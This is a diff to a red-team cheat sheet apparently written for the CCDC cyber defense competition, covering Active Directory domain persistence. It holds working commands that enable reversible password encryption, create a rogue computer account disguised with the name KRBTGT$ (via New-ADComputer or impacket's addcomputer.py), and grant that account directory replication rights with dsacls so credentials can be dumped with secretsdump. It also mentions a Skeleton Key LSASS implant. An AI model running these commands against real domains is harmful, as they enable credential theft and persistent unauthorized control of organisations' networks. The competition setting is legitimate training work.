@@ -141,7 +141,7 @@ pagetitle: Red Teaming for CCDC
 ## Domain Persistence
 
 **Plaintext Password**
-- Turn on reversible encryption: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $false`
+- Turn on reversible encryption: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $true`
 
 **Skeleton Key**
 - Implants into LSASS and creates master password working for any AD account
@@ -173,8 +173,9 @@ pagetitle: Red Teaming for CCDC
 
 **Adding a new Computer Account**
 - Might be overlooked during normal user password rotations
-- `addcomputer.py -computer-name 'KRBTGT$' -computer-pass '{new_password}' -dc-host "{dc_ip}" -domain-netbios '{domain}' '{domain}'/'{owned_user}':'{owner_user_pass}'`
-- Then on Windows, give it permissions over the domain (so we can secretsdump)
+- `New-ADComputer -Name {PC_NAME_NO_$} -AccountPassword (ConvertTo-SecureString '{new_pass}' -AsPlainText -Force) -Enabled $true`
+  - If on linux: `addcomputer.py -computer-name 'KRBTGT$' -computer-pass '{new_password}' -dc-host "{dc_ip}" -domain-netbios '{domain}' '{domain}'/'{owned_user}':'{owner_user_pass}'`
+- Then give it permissions over the domain (so we can secretsdump)
   - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes'`
   - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes All'`
 		
